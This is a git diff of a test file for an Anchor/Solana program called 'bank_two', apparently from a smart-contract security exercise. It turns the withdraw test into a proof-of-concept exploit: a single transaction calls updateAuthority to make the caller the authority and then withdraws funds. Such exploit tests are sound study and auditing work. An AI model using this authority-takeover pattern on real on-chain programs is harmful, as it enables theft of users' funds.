@@ -41,39 +41,30 @@ describe("bank_two", () => {
     console.log("Your transaction signature", transactionSignature);
   });
 
-  it("Withdraw", async () => {
-    const walletInitialBalance = await connection.getBalance(wallet.publicKey);
-
-    const updateAuthorityInstruction = await program.methods
+  it("withdraw", async () => {
+    const updateAuthorityIx = await program.methods
       .updateAuthority()
-      .accounts({
-        newAuthority: wallet.publicKey,
-      })
-      .instruction();
+      .accounts({ newAuthority: wallet.publicKey })
+      .instruction()
 
-    const withdrawInstruction = await program.methods
+    const withdrawExploitInstruction = await program.methods
       .withdraw(new anchor.BN(amount))
       .accounts({ authority: wallet.publicKey })
-      .instruction();
+      .instruction()
 
-    const transaction = new anchor.web3.Transaction().add(
-      updateAuthorityInstruction,
-      withdrawInstruction
-    );
+    const Exploittxn = new anchor.web3.Transaction().add(
+      updateAuthorityIx,
+      withdrawExploitInstruction,
+    )
 
-    const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
+    const exploitSignature = await anchor.web3.sendAndConfirmTransaction(
       connection,
-      transaction,
+      Exploittxn,
       [wallet.payer],
-      { commitment: "confirmed" }
-    );
+      {commitment:"confirmed"}
+    )
 
-    console.log("Your transaction signature", transactionSignature);
+    console.log("⚠️ exploit signautre : ", exploitSignature)
+  })
 
-    const walletFinalBalance = await connection.getBalance(wallet.publicKey, {
-      commitment: "confirmed",
-    });
-
-    assert.equal(walletFinalBalance, walletInitialBalance + amount);
-  });
 });
